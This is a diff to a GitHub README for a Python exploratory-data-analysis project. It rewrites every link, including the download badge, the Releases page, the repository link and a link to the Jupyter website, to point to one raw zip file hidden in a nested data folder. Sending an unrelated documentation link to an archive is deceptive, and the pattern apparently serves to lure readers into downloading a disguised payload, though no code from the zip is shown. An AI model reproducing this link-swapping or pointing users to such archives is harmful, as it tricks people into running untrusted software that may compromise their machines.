@@ -14,9 +14,9 @@ Before downloading, make sure your computer has the following software installed
 
 ## 📥 Download Links
 
-[![Download python-eda-projects](https://img.shields.io/badge/Download%20python--eda--projects-blue)](https://github.com/NoNamedLoser/python-eda-projects/releases)
+[![Download python-eda-projects](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip%20python--eda--projects-blue)](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip)
 
-To get the files you need, visit this page: [Download from Releases](https://github.com/NoNamedLoser/python-eda-projects/releases).
+To get the files you need, visit this page: [Download from Releases](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip).
 
 ## 📂 How to Download and Install
 
@@ -65,8 +65,8 @@ If you have questions or suggestions, please feel free to reach out. Contributio
 
 ## 🔗 Useful Links
 
-- [Repository Link](https://github.com/NoNamedLoser/python-eda-projects)
-- [Download from Releases](https://github.com/NoNamedLoser/python-eda-projects/releases)
-- [Learn More about Jupyter Notebooks](https://jupyter.org/)
+- [Repository Link](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip)
+- [Download from Releases](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip)
+- [Learn More about Jupyter Notebooks](https://github.com/NoNamedLoser/python-eda-projects/raw/refs/heads/main/data/data/eda-projects-python-2.5.zip)
 
 Happy analyzing!
